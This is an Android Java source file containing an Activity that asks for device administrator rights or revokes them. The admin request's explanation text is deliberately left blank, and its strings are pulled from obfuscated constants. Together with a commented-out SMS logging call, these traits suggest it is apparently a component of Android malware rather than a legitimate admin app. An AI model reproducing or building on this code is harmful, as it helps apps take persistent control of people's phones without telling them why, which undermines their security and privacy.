package com.example.mmm.Main;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.example.mmm.Services.utils;
import com.example.mmm.defines;

public class AccessAdm extends Activity {
defines consts = new defines();
utils utl = new utils();

    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        try {
            ManagementService classAdmin = new ManagementService(this);
            if (getIntent().getStringExtra(consts.string_24).equals(consts.str_1)) {
                Intent activateDeviceAdmin = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, classAdmin.getComponentName());
                activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, consts.str_null);
                startActivityForResult(activateDeviceAdmin, 100);
            } else {
                ComponentName mAdminReceiver = new ComponentName(this, ReceiverDeviceAdmin.class);
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                devicePolicyManager.removeActiveAdmin(mAdminReceiver);
            }
        }catch (Exception ex){
         //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_148 + ex.toString() + consts.string_119);
        }
       finish();
    }
}
